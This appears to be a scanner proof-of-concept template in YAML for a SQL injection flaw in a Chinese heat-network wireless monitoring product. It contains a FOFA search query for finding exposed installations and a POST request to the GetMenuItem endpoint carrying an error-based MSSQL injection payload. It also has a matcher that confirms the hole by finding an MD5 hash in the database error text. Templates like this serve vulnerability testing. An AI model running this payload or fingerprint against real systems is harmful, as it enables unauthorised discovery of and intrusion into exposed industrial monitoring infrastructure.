id: poc-yaml-rewang-wireless-monitoring-system-getmenuitem-sqli
info:
  name: 热网无线监测系统 GetMenuItem SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 热网无线监测系统
  fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /DataSrvs/UCCGSrv.asmx/GetMenuItem
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: name=1') AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--
    +
  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值 \") &&\ncontains(body,\"\
    转换成数据类型 int 时失败\") &&\ncontains(body,\"0x\"+t2)\n"
transport: http
